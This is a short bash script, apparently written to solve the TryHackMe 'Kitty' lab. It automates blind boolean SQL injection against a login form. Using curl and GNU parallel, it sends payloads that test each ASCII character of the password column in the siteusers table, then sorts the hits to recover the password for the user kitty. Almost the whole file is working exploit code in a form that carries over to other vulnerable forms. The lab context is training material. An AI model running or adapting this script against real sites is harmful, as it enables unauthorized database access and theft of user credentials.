#!/bin/bash
# Created this to solve the TryHackMe lab called 'Kitty'.  
# This script perfroms blind boolean sql injection to dump the password for username kitty.  

echo -n '' > dumped_data.txt  

function sqli(){
num=$1
offset=$2
char=$3

# Make sure to register username johnwick on the site (http://10.10.72.244/register.php) first before running this script
request=$(curl -X POST -sqi 'http://10.10.26.45/index.php' --proxy 127.0.0.1:8080 --data "username=johnwick'and (select (select ascii(substring(password,$num,1))from siteusers limit 1 offset $offset)='$char')-- -");
if [[ $request == *302* ]];
	  then char_letter=$(echo "$char" | awk '{printf "%c\n", $1 }');
	  echo "offset $offset number $num $char_letter" >> dumped_data.txt;fi
}

export -f sqli

parallel -j 100 sqli ::: `seq 1 16` ::: `seq 0 1` ::: `seq 32 127`
cat dumped_data.txt|sort -t ' ' -k2 -k4 -n
